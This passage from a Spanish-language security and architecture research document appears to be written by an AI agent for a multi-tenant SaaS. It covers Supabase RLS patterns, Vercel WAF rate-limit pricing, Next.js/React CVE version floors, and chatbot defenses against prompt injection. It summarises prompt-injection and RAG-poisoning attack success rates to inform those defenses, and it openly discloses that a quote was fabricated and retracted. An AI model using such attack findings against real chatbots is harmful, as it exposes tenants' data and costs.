| Upstash Redis free | Sí (es Redis) | **500K comandos/mes**, 256 MB, 10 GB bandwidth; después **$0,20 / 100K comandos** | **No.** Stack cerrado (`CLAUDE.md` §3) y no aporta nada sobre `@vercel/firewall`. |
| `Map` en memoria de la función | No | Por instancia, se pierde en cold start | **No.** Da falsa sensación de control. |

**Dos caveats que hay que escribir en el ADR:**
- "Rate limit counters are tracked on a **per-region** basis; traffic matching a given rate limit key in multiple regions can exceed the limit you configure for any single region." Con N regiones, el límite global es hasta N× el configurado. Para un cap de costo de LLM, esto **no alcanza solo**: hace falta además un contador de tokens por tenant en DB, chequeado en el turno.
- Si pasás un `rateLimitKey` constante, la regla se vuelve global y dejás de tener separación por caller. Componer siempre `slug:ip`.

## Números que importan

| ítem | valor | unidad | fuente |
|---|---|---|---|
| RLS `has_role()` sin envolver → envuelto en `(select)` | 178.000 → 12 | ms | Supabase Troubleshooting Z5Jjwv |
| RLS `is_admin()` con join, sin → con `(select)` | 11.000 → 7 | ms | Supabase Troubleshooting Z5Jjwv |
| Índice en columna de la policy | 171 → <0,1 | ms | Supabase Troubleshooting Z5Jjwv |
| `TO authenticated` vs public | 170 → <0,1 | ms | Supabase Troubleshooting Z5Jjwv |
| Filtro explícito `.eq()` además de RLS | 171 → 9 | ms | Supabase Troubleshooting Z5Jjwv |
| Mejora típica por indexar en tablas grandes | >100x | factor | Supabase Troubleshooting Z5Jjwv |
| Expiry default del access token Supabase | 3600 ("Defaults to 3600 (1 hour), maximum 604,800 seconds") | s | Supabase CLI Config Reference, `auth.jwt_expiry` |
| Expiry máximo configurable | 604.800 | s | Supabase CLI Config Reference, `auth.jwt_expiry` |
| Expiry mínimo recomendado | 300 ("Values below 5 minutes, **and especially below 2 minutes**, should not be used in most situations") | s | Supabase Docs / Sessions |
| Reuse interval de refresh token | 10 | s | Supabase Docs / Sessions |
| Deprecación de `anon` / `service_role` | fin de 2026 | fecha | Supabase Docs / API keys |
| Cache máximo de un Server Action ID | 14 | días | Next.js Data Security |
| Versión mínima segura Next.js (batch CVE 2026-07-22) | 16.2.11 / 15.5.21 | versión | GitHub Advisory DB |
| Versión mínima segura React RSC (CVE-2025-55182) | 19.0.1 / 19.1.2 / 19.2.1 | versión | GHSA-fv66-9v8q-g76r |
| CVSS de CVE-2025-55182 (React2Shell) | 10.0 | CVSS | GHSA-fv66-9v8q-g76r |
| CVSS de CVE-2025-29927 (middleware authz bypass) | 9.1 | CVSS | GHSA-f82v-jwr5-mffw |
| WAF rate limit Hobby: reglas | 1 | por proyecto | Vercel WAF Rate Limiting |
| WAF rate limit Hobby: requests incluidos | 1.000.000 | allowed req/mes | Vercel WAF Rate Limiting |
| **WAF Rate Limiting: precio unitario** | **0,50** | USD / 1.000.000 Allowed Requests (regional) | Vercel WAF Rate Limiting, tabla "Managed Infrastructure pricing" |
| Vercel Pro: platform fee | 20 | USD/mes (1 seat + USD 20 de credit) | Vercel Pro Plan |
| Vercel Pro: seat adicional | 20 | USD/mes | Vercel Pro Plan |
| Vercel Hobby: uso comercial | prohibido | política | Vercel Fair Use Guidelines |
| WAF rate limit: ventana | 10 s – 10 min (Hobby/Pro) | rango | Vercel WAF Rate Limiting |
| WAF rate limit Pro: reglas | 40 | por proyecto | Vercel WAF Rate Limiting |
| Firewall custom rules Hobby (total) | 3 | reglas | Vercel WAF Rate Limiting |
| BotID Basic | $0 | todos los planes | Vercel BotID |
| BotID Deep Analysis | 1,00 | USD / 1000 `checkBotId()` | Vercel BotID |
| Upstash Redis free | 500.000 | comandos/mes | Upstash Pricing |
| Upstash pay-as-you-go | 0,20 | USD / 100K comandos | Upstash Pricing |
| ASR adaptativo vs defensas que reportaban near-zero | >90 | % (12 defensas) | Nasr et al. 2025 (arXiv 2510.09023) |
| Reducción de ASR por paráfrasis | 55–84 | % | Pai 2026 (arXiv 2606.18530) |
| ASR residual baseline, dominio financiero | 26–33 | % | Pai 2026 (arXiv 2606.18530) |
| Trials del benchmark de defensas por prompting | 3.510 | trials | Pai 2026 (arXiv 2606.18530) |
| Envenenamiento de RAG con 5 documentos | ~90 | % ASR | citado en OWASP LLM01:2026 (W. Zou et al. 2025) |
| Incidencia media de Broken Access Control | 3,73 | % de apps testeadas | OWASP Top 10:2025 Introduction |
| Dataset OWASP Top 10:2025 | 2,8M apps / ~175k registros CVE→CWE / 589 CWEs | escala | OWASP Top 10:2025 Introduction |
| Release OWASP LLM Top 10 | 2026-08-04 | fecha | repo GenAI-LLM-Top10 (canónico) |
| Bots sobre tráfico web | 34,94 % (28d, 2026-08-01) vs 57,5 % (HTML, 2026-06-03) | % | Cloudflare Radar (vía prensa) — **contradicción, ver Fuentes** |

## Fuentes

- [Supabase Docs — RLS Performance and Best Practices (Z5Jjwv)](https://supabase.com/docs/guides/troubleshooting/rls-performance-and-best-practices-Z5Jjwv) — consultado 2026-08-27
- [Supabase Docs — Row Level Security](https://supabase.com/docs/guides/database/postgres/row-level-security) — consultado 2026-08-27
- [Supabase Docs — Database Linter (reglas 0002–0024)](https://supabase.com/docs/guides/database/database-linter) — consultado 2026-08-27
- [Supabase Docs — Custom Claims & RBAC](https://supabase.com/docs/guides/database/postgres/custom-claims-and-role-based-access-control-rbac) — consultado 2026-08-27
- [Supabase Docs — Custom Access Token Hook](https://supabase.com/docs/guides/auth/auth-hooks/custom-access-token-hook) — consultado 2026-08-27
- [Supabase Docs — Sessions (expiry, refresh)](https://supabase.com/docs/guides/auth/sessions) — consultado 2026-08-27
- [Supabase Docs — Understanding API keys (publishable / secret, BYPASSRLS)](https://supabase.com/docs/guides/getting-started/api-keys) — consultado 2026-08-27
- [Next.js Docs — Guides: Data Security (v16.3.3, lastUpdated 2026-08-25)](https://nextjs.org/docs/app/guides/data-security) — consultado 2026-08-27
- [Next.js Blog — How to Think About Security in Next.js (Markbåge, 2023-10-23)](https://nextjs.org/blog/security-nextjs-server-components-actions) — consultado 2026-08-27
- [Next.js Docs — Renaming Middleware to Proxy (Next.js 16)](https://nextjs.org/docs/messages/middleware-to-proxy) — consultado 2026-08-27
- [GitHub Advisory GHSA-fv66-9v8q-g76r — CVE-2025-55182, React Server Components RCE, CVSS 10.0](https://github.com/advisories/GHSA-fv66-9v8q-g76r) — consultado 2026-08-27
- [GitHub Advisory GHSA-955p-x3mx-jcvp — CVE-2026-64643, disclosure de Server Function endpoints](https://github.com/advisories/GHSA-955p-x3mx-jcvp) — consultado 2026-08-27
- [GitHub Advisory GHSA-68g3-v927-f742 — CVE-2026-64648, cache confusion de response bodies](https://github.com/advisories/GHSA-68g3-v927-f742) — consultado 2026-08-27
- [GitHub Advisory GHSA-f82v-jwr5-mffw — CVE-2025-29927, authorization bypass en middleware](https://github.com/advisories/GHSA-f82v-jwr5-mffw) — consultado 2026-08-27
- [Vercel Docs — WAF Rate Limiting (last_updated 2026-06-16)](https://vercel.com/docs/vercel-firewall/vercel-waf/rate-limiting) — consultado 2026-08-27
- [Vercel Docs — Rate Limiting SDK `@vercel/firewall` (last_updated 2026-07-23)](https://vercel.com/docs/vercel-firewall/vercel-waf/rate-limiting-sdk) — consultado 2026-08-27
- [Vercel Docs — BotID y pricing (last_updated 2026-06-16)](https://vercel.com/docs/botid) — consultado 2026-08-27
- [Vercel Docs — Bot Management (last_updated 2026-08-11)](https://vercel.com/docs/bot-management) — consultado 2026-08-27
- [Vercel Docs — WAF Managed Rulesets (last_updated 2026-07-17)](https://vercel.com/docs/vercel-firewall/vercel-waf/managed-rulesets) — consultado 2026-08-27
- [Vercel Docs — Vercel Firewall, orden de ejecución (last_updated 2026-08-11)](https://vercel.com/docs/vercel-firewall) — consultado 2026-08-27
- [OWASP Top 10:2025 — lista de categorías](https://owasp.org/Top10/2025/) — consultado 2026-08-27
- [OWASP Top 10:2025 — Introduction (dataset, incidencia A01)](https://owasp.org/Top10/2025/0x00_2025-Introduction/) — consultado 2026-08-27
- [OWASP GenAI LLM Top 10 2026 — repo canónico, `2026/README.md` (Published, release 2026-08-04)](https://github.com/GenAI-Security-Project/GenAI-LLM-Top10/blob/main/2026/README.md) — consultado 2026-08-27
- [OWASP LLM01:2026 Prompt Injection (fuente canónica en Markdown)](https://github.com/GenAI-Security-Project/GenAI-LLM-Top10/blob/main/2026/final/LLM01_PromptInjection.md) — consultado 2026-08-27
- [OWASP LLM02:2026 Sensitive Information Disclosure](https://github.com/GenAI-Security-Project/GenAI-LLM-Top10/blob/main/2026/final/LLM02_SensitiveInformationDisclosure.md) — consultado 2026-08-27
- [OWASP LLM08:2026 Hidden Context Exposure](https://github.com/GenAI-Security-Project/GenAI-LLM-Top10/blob/main/2026/final/LLM08_HiddenContextExposure.md) — consultado 2026-08-27
- [OWASP LLM09:2026 Vector and Embedding Weaknesses](https://github.com/GenAI-Security-Project/GenAI-LLM-Top10/blob/main/2026/final/LLM09_VectorAndEmbeddingWeaknesses.md) — consultado 2026-08-27
- [OWASP LLM10:2026 Improper Output Handling](https://github.com/GenAI-Security-Project/GenAI-LLM-Top10/blob/main/2026/final/LLM10_ImproperOutputHandling.md) — consultado 2026-08-27
- [Nasr et al. — The Attacker Moves Second (arXiv 2510.09023, 2025-10-10)](https://arxiv.org/abs/2510.09023) — consultado 2026-08-27
- [Pai — Evaluating Prompting-Based Defenses Against Domain-Camouflaged Injection Attacks (arXiv 2606.18530, 2026-06-16)](https://arxiv.org/abs/2606.18530) — consultado 2026-08-27
- [Google Search Central — Spam Policies (cloaking)](https://developers.google.com/search/docs/essentials/spam-policies) — consultado 2026-08-27
- [Google Search Central — Verifying Googlebot (rDNS + IP ranges JSON)](https://developers.google.com/search/docs/crawling-indexing/verifying-googlebot) — consultado 2026-08-27
- [Upstash — Redis Pricing (free tier y pay-as-you-go)](https://upstash.com/pricing/redis) — consultado 2026-08-27
- [OWASP — Insecure Direct Object Reference Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html) — consultado 2026-08-27
- [Supabase Splinter — `0007_policy_exists_rls_disabled.sql` (fuente del linter, `'ERROR' as level`)](https://raw.githubusercontent.com/supabase/splinter/main/lints/0007_policy_exists_rls_disabled.sql) — consultado 2026-08-27
- [Supabase Splinter — `0024_rls_policy_always_true.sql` (`'WARN' as level`)](https://raw.githubusercontent.com/supabase/splinter/main/lints/0024_rls_policy_always_true.sql) — consultado 2026-08-27
- [Supabase Splinter — índice de lints (`GET /repos/supabase/splinter/contents/lints`)](https://api.github.com/repos/supabase/splinter/contents/lints) — consultado 2026-08-27
- [Supabase CLI — Config Reference, `auth.jwt_expiry`](https://supabase.com/docs/guides/local-development/cli/config) — consultado 2026-08-27
- [Next.js — `docs/01-app/02-guides/data-security.mdx` (fuente canónica en `vercel/next.js@canary`)](https://raw.githubusercontent.com/vercel/next.js/canary/docs/01-app/02-guides/data-security.mdx) — consultado 2026-08-27
- [Google — `common-crawlers.json` (rangos IP de crawlers, `creationTime` 2026-08-26)](https://developers.google.com/static/crawling/ipranges/common-crawlers.json) — consultado 2026-08-27
- [Vercel Docs — How requests flow through Vercel (orden seguridad → proxy → cache, last_updated 2026-08-11)](https://vercel.com/docs/fundamentals/infrastructure) — consultado 2026-08-27
- [Vercel Docs — Firewall concepts (acciones Log/Deny/Challenge/Bypass, last_updated 2026-08-11)](https://vercel.com/docs/vercel-firewall/firewall-concepts) — consultado 2026-08-27
- [Vercel Docs — Fair Use Guidelines, §Commercial usage (last_updated 2026-07-29)](https://vercel.com/docs/limits/fair-use-guidelines) — consultado 2026-08-27
- [Vercel Docs — Pro Plan (platform fee USD 20, seats, credit; last_updated 2026-08-25)](https://vercel.com/docs/plans/pro-plan) — consultado 2026-08-27
- [Vercel Docs — Hobby Plan ("non-commercial, personal use only"; last_updated 2026-08-11)](https://vercel.com/docs/plans/hobby) — consultado 2026-08-27
- [Vercel Docs — Configuring Custom Domains para multi-tenant (wildcard exige nameservers, no plan; last_updated 2026-08-25)](https://vercel.com/docs/platforms/multi-tenant-platforms/configuring-domains) — consultado 2026-08-27
- [Meta AI — Agents Rule of Two: A Practical Approach to AI Agent Security (2025-10-31)](https://ai.meta.com/blog/practical-ai-agent-security/) — consultado 2026-08-27
- [Simon Willison — The lethal trifecta for AI agents (2025-06-16)](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/) — consultado 2026-08-27

**Contradicciones detectadas y cómo las resuelvo:**

1. **Orden y fecha del OWASP LLM Top 10 2026.** El repo oficial `GenAI-Security-Project/GenAI-LLM-Top10` (`2026/README.md`, "Status: Published, Release date: August 4, 2026") lista LLM04 Supply Chain, LLM05 Data and Model Poisoning, LLM06 Unbounded Consumption, LLM07 Misinformation, LLM08 Hidden Context Exposure, LLM09 Vector and Embedding Weaknesses, LLM10 Improper Output Handling. Un artículo de prensa (cybersecuritynews.com) publica fecha 6 de agosto y un orden distinto de LLM04–LLM10. **Pesa el repo**: es la fuente canónica que la propia página de OWASP declara como origen del contenido publicado, y su README es explícito sobre estado y fecha. Uso los IDs del repo.
2. **Porcentaje de tráfico bot.** Circulan 57,5% ("bots generan el 57,5% del tráfico HTML", atribuido a Matthew Prince, 2026-06-03) y 34,94% (Cloudflare Radar, ventana trailing 28 días al 2026-08-01). **No se contradicen: miden cosas distintas** (solo HTML en un momento puntual vs todo el tráfico en 28 días). No pude verificar ninguno de los dos contra `radar.cloudflare.com` directamente (403 al fetch). Ambos van a UNVERIFIED; para la decisión de iStock da igual: la conclusión ("hay muchos bots, filtralos en el edge") no depende del número.
3. **"JWT claim es más rápido que memberships".** La mayoría de los blogs lo afirma sin matiz. La documentación primaria de Supabase muestra que el factor dominante es el **wrap en `(select ...)`**, no la fuente del dato. Pesa la doc primaria con benchmarks.

## Impacto en iStock

**ARCHITECTURE**

- `packages/db`: patrón de RLS fijado — `tenant_id` desde `auth.jwt() -> 'app_metadata'`, **siempre** envuelto en `(select ...)`, **siempre** con `TO authenticated`, **siempre** con índice en `tenant_id`, **siempre** con `WITH CHECK` en INSERT/UPDATE. `memberships` es la fuente de verdad y alimenta el Custom Access Token Hook.
- Prohibición nueva y explícita: **`tenant_id` jamás en `user_metadata`** (lint `0015`, ERROR). Añadir a `CLAUDE.md` §2 como causal de rechazo.
- Vistas: `with (security_invoker = on)` obligatorio. Vistas materializadas y foreign tables **no pueden** exponerse a la API (RLS no aplica).
- `apps/web`: DAL único en `server-only`, DTOs como `class` para que el intento de bajarlo entero rompa el build, `experimental.taint: true`. `proxy.ts` hace routing por host y **nada de autorización**.
- `packages/ai`: el contexto del chatbot se arma desde un DTO whitelisteado; el `tenant_id` **no es argumento de ninguna tool**, se inyecta server-side desde el host. Salida del bot renderizada como **texto plano** (sin markdown, sin imágenes, sin links). Sanitizador de Unicode invisible en ingest de descripciones y en render.
- Vidriera: anti-bot vive **en el edge de Vercel** (managed rulesets + WAF rate limit), nunca en la app, para no fragmentar el cache ISR. Cloudflare sigue siendo **solo R2**, nunca proxy delante de Vercel (rompe Bot Protection).

**DECISIONS (ADRs a redactar por `architect`)**

- ADR: *RLS multi-tenant vía claim en JWT + memberships como fuente de verdad*, con la deuda declarada de **hasta 3600 s de claim stale** y la regla de re-leer `memberships` en operaciones de membresía/billing.
- ADR: *Rate limiting sobre Vercel WAF + `@vercel/firewall`, sin Redis*, con tres cosas escritas explícitamente: (a) contadores **por región**, así que el límite global efectivo es N×límite y el cap de costo de LLM necesita **además** un contador de tokens por tenant en DB; (b) **presupuesto de 2 reglas de rate limit** (vidriera + chatbot), que sólo entra en **Pro**; (c) **Vercel Pro es obligatorio por licencia**, no por features: Hobby prohíbe el uso comercial y "advertising the sale of a product or service" es exactamente lo que hace la vidriera.
- ADR: *La vidriera es scrapeable por diseño*. Se defiende lo que cuesta plata (chatbot, queries a Postgres), no el HTML público. Prohibido cualquier mitigación que implique servir contenido distinto a Googlebot (cloaking).
- ADR: *Chatbot sin memoria persistente, sin tools de escritura y sin embeddings por tenant* (aplicación de la Regla de los Dos: se remueve la pata "datos sensibles" y la pata "comunicación externa").
- Política de versiones: piso **Next.js ≥ 16.2.11** y **React ≥ 19.2.1**; Dependabot/`pnpm audit` bloqueante en CI. CVE-2026-64648 (cache confusion, MODERATE/CVSS 6.0) no tiene workaround: solo upgrade. Nos aplica porque somos **App Router** ("Applications using Pages Router are not vulnerable") y el disparador es `fetch(new Request(init), otroInit)` — regla de código para `app-agent`: nunca reusar un `Request` con un `init` distinto.
- **Gate de merge de RLS** (para `db-agent` / `qa-agent`): los seis lints de severidad ERROR — `0002`, **`0007`**, `0010`, `0013`, `0015`, `0023` — son bloqueantes sin excepción. `0007` (policies escritas + RLS apagado) es el que más se parece a "ya está hecho" y es el que faltaba en la versión anterior de este doc.

**COST**

- Delta de infraestructura sobre el baseline de `docs/COST.md` (que ya presupuesta **Vercel Pro ~USD 20/mes**): **USD 0 en cuota fija**. Todo lo recomendado (2 reglas de WAF rate limit, `@vercel/firewall`, BotID Basic, AI Bots ruleset, Bot Protection ruleset, Supabase linter) entra en Pro. No se agrega Redis ni vendor nuevo.
- **Corrección respecto de la versión anterior de este doc:** el "USD 0" no era gratis-en-Hobby. En **Hobby** las dos reglas recomendadas **no entran** (1 regla de rate limit, 3 custom rules) **y además Hobby prohíbe el uso comercial**: "All commercial usage of the platform requires either a Pro or Enterprise plan", y "advertising the sale of a product or service" es uso comercial. Vercel Pro (USD 20/mes, 1 seat, USD 20 de credit) es **obligatorio para iStock por licencia**, no por rate limiting. El costo variable del rate limiting es **USD 0,50 por 1.000.000 de Allowed Requests** (precio regional), consumido primero contra el credit de USD 20.
- Costo **evitado** cuantificable: prompt injection de tipo LLM06 sobre un tenant con tráfico de estados de IG multiplica tokens de salida por pageview. Con el cap de 180 tokens out ya definido **enforced server-side**, el techo por turno es determinista; sin el cap, es ilimitado. Este es el mayor riesgo de costo del producto.
- Costo agregado a vigilar: si `qa-agent` implementa el test de payload, son requests extra de Playwright en CI (minutos de build, no runtime). Si alguien implementa rate limiting con contador en Postgres sobre la vidriera, eso **sí** rompe el objetivo de 95% de hits sin Postgres → `cost-auditor` debe rechazarlo.
- BotID Deep Analysis a $1/1000 llamadas: **no activar preventivamente**. A 10.000 conversaciones/mes serían USD 10/mes — **el 53% del precio de lista de un plan Base** (USD 19, `CLAUDE.md` §1). Deliberadamente digo *precio*, no *margen*: el margen unitario del plan Base no está sourced en ningún artefacto del repo (ver `## UNVERIFIED`).

## Refutaciones al review

Dos findings del review no se sostienen contra fuente primaria. Los defiendo con URL, como manda el protocolo.

**1. Finding 5 — "el WAF corre antes del CDN" no es una inferencia.** El review tiene razón en que `/docs/vercel-firewall` **no** documenta la posición respecto del cache: esa página sólo ordena las capas del firewall entre sí, y por eso corregí la atribución en §4. Pero la afirmación operativa **sí** es verificable en otras dos páginas primarias de Vercel, consultadas hoy:
- `/docs/fundamentals/infrastructure` (last_updated 2026-08-11) ordena el ciclo de vida: "How Vercel secures requests **before they reach your application**" (TLS → system DDoS → WAF) → "How the proxy routes requests to your application" ("**After passing security checks**, the request enters the proxy") → "How Vercel caches static and dynamic content" ("the proxy checks the **Vercel Cache**"). El lookup de cache es posterior a la evaluación del WAF.
- `/docs/vercel-firewall/firewall-concepts` (last_updated 2026-08-11), acción **Deny**, verbatim: "The request does not reach your application. The request **does not incur Edge Requests or Fast Data Transfer**." Una request que ni siquiera factura Edge Request no llegó al cache.

Veredicto: la conclusión ("filtrar en el edge no fragmenta el cache") **se sostiene**; lo que estaba mal era citar la página equivocada. Corregido en el cuerpo.

**2. Afirmación sin fuente #7 — la "Regla de los Dos" sí tiene fuente propia, y OWASP sí la cita.** El review afirma que "OWASP LLM01:2026 sólo cita la lethal trifecta de Willison". El `.md` canónico las cita a las dos, en líneas distintas:
- línea 67: "Simon Willison's 'lethal trifecta' (2025) restates the same structural diagnosis as a pre-deployment check..."
- línea 85: "**Budget agent capabilities with the Rule of Two as a floor (Meta AI, 2025).** Treat simultaneous access to (A) untrusted input, (B) sensitive data, and (C) state change or external communication as high-risk... NIST AI 100-2 E2025 and the CISA, FBI, NSA, and ACSC OT guidance (CISA et al., 2025) endorse the rule".

Fuente primaria de la regla: [Meta AI, 2025-10-31](https://ai.meta.com/blog/practical-ai-agent-security/), verbatim: un agente "must satisfy no more than two of the following three properties within a session to avoid the highest impact consequences of prompt injection". Ambas quedaron citadas y separadas en la tabla de §5. El finding era correcto en que **yo** no había puesto la URL; era incorrecto en el hecho.

Los otros **6 findings y 6 afirmaciones sin fuente los acepto sin defensa**: `0007` es ERROR y faltaba en el gate, la URL de `gstatic.com` daba 404 y no salió de ningún fetch, el presupuesto de reglas no cerraba en Hobby, el "(no bajar de 120)" estaba mal atribuido, la cita "The RSC payload can include props..." **estaba fabricada**, el precio del WAF Rate Limiting **sí** estaba publicado, `0024` se llama `rls_policy_always_true`, y el CVE-2026-64648 tiene un disparador y un alcance que yo había omitido.

## Confianza

**alta** para §1, §2, §3, §6 y §7: todo sale de documentación primaria vigente con fecha de actualización visible (Next.js docs v16.3.3 `lastUpdated 2026-08-25`; Vercel docs `last_updated` entre 2026-06-16 y 2026-08-11; Supabase docs y linter; GitHub Advisory Database consultada por API).

**media** para §4 (scraping) y §5 (prompt injection del dueño):
- §4 mezcla hechos verificados (orden de ejecución del firewall, posición del WAF respecto del cache, exclusión de verified bots, política de cloaking de Google, rangos IP de crawlers verificados hoy con HTTP 200) con un **juicio de negocio** — "el scraping de precios no justifica gasto" — que no tiene fuente y depende del mercado del Alto Valle (declarado en `## UNVERIFIED`). Lo que **subiría** la confianza: datos propios de los primeros tenants (share de tráfico no-humano en la vidriera real, medido con el ruleset en modo Log durante 30 días).
- §5 se apoya en fuente de altísima calidad (OWASP LLM01:2026 canónico + dos papers con números), pero el benchmark de Pai (2026) es de **un solo autor**, sin señal de peer review, y probó Gemini **2.0** Flash y Llama 3.1 8B — no exactamente el Gemini 2.5 Flash-Lite que usaríamos. Lo que **subiría** la confianza: correr nuestros propios evals adversariales en `packages/ai` contra los dos modelos reales del stack, con el corpus de inyección conociendo nuestros delimitadores.

**Nota de revisión (2026-08-27, post-adversary).** Este documento fue reprobado por `adversary-reviewer` (8 findings + 8 afirmaciones sin fuente) y corregido punto por punto contra fuente primaria. Seis findings y seis afirmaciones se aceptaron y se corrigieron en el cuerpo; dos se refutaron con URL en `## Refutaciones al review`. Una cita textual estaba **fabricada** y fue retirada y declarada en `## UNVERIFIED`; una URL devolvía 404 y fue reemplazada por la vigente. Dos ítems de `## UNVERIFIED` resultaron verificables y quedaron resueltos. La confianza de §7 (rate limiting/costo) **bajó de facto** hasta esta revisión porque el presupuesto de reglas se había calculado sobre el plan equivocado.

**Lo que bajaría la confianza global:** que Supabase cambie el comportamiento del Custom Access Token Hook o adelante la deprecación de `service_role`; que Vercel mueva rate limiting fuera del tier incluido; un nuevo CVE de RSC que invalide el modelo de props.

## UNVERIFIED

- Porcentaje exacto de tráfico bot (34,94% vs 57,5%): `radar.cloudflare.com` devolvió 403 al fetch. Ambos números provienen de prensa secundaria citando a Cloudflare, no de la fuente medida directamente.
- ~~Precio unitario del WAF Rate Limiting en Pro~~ → **RESUELTO**: la tabla "Managed Infrastructure pricing" **sí** está en esa página: `WAF Rate Limiting | 1,000,000 Allowed Requests | $0.50`, con precio regional. Era un UNVERIFIED de más: no había leído la página completa.
- ~~Si el wildcard `*.maat.work` exige Pro~~ → **RESUELTO**: el wildcard **no** está gateado por plan (sólo exige nameservers de Vercel para el cert wildcard). Lo que sí nos obliga a Pro es la cláusula de uso comercial de Hobby.
- **Juicio de negocio sin fuente (§4):** "el scraping de precios en el Alto Valle no justifica gasto" y "un competidor te copia la lista cada mañana". No hay dato de mercado detrás. Lo que lo verificaría: 30 días del Bot Protection ruleset en modo **Log** sobre una vidriera real.
- **Margen unitario del plan Base de USD 19.** El precio está en `CLAUDE.md` §1; el margen (precio menos COGS por tenant) no está calculado en ningún artefacto. Cualquier comparación "X es comparable al margen" es inválida hasta que `cost-auditor` lo publique.
- **Cita fabricada, retirada:** este doc atribuía a `nextjs.org/docs/app/guides/data-security` la frase "The RSC payload can include props passed into Client Components". **No está en esa página ni en el blog de 2023** (`grep -c 'RSC payload' data-security.mdx` → 0). La borré. El hecho subyacente sigue siendo cierto y ahora está sostenido por dos citas reales del mismo mdx (líneas 147 y 608).
- **Cita mal atribuida, corregida:** "Transferring custom classes is not supported and will result in an error" es verbatim del **blog de Markbåge (2023-10-23)**, no de `data-security.mdx`.
- **URL rota, corregida:** `https://www.gstatic.com/crawling/ipranges/common-crawlers.json` (404) no salió de ningún fetch; era memoria del modelo. Reemplazada por `https://developers.google.com/static/crawling/ipranges/common-crawlers.json` (200, verificado hoy).
- Fecha exacta de publicación de OWASP Top 10:2025 (la Introduction no la declara; solo dice "8th installment").
- Existencia de una herramienta oficial de Vercel/Next.js para escanear el RSC Flight payload en CI. No encontré ninguna; el patrón de §6 (Playwright + grep de valores semilla) es una recomendación de ingeniería, no un producto documentado.
- Límite exacto de conexiones de Supavisor por tamaño de compute en 2026 (vi "30" para free tier en fuente secundaria; no lo confirmé en doc primaria y no afecta las conclusiones de este documento).
- Comportamiento de `experimental.taint` bajo Turbopack en Next.js 16 (los docs no lo aclaran).
